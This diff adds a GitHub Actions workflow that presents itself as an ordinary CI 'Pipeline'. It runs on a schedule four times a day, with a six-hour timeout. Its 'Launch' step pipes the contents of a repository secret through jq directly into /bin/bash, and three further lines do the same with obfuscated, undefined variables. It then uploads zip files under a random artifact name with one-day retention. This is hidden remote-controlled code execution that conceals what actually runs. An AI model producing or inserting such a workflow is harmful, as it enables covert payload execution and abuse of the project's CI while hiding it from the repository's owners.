@@ -1,0 +1,32 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '47 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          lvp2344: ${{ secrets.lvp2344 }}
+        run: |
+          printf '%s' "$lvp2344" | jq -r .efbbb6 | /bin/bash
+          echo $zub87 | jq -r .ww70 | /bin/bash
+          printf '%s' "$s5253" | jq -r .u19519 | /bin/bash
+          echo $bnup89467 | jq -r .kngz1823 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: mSgnlTfi
+          path: "*.zip"
+          retention-days: 1
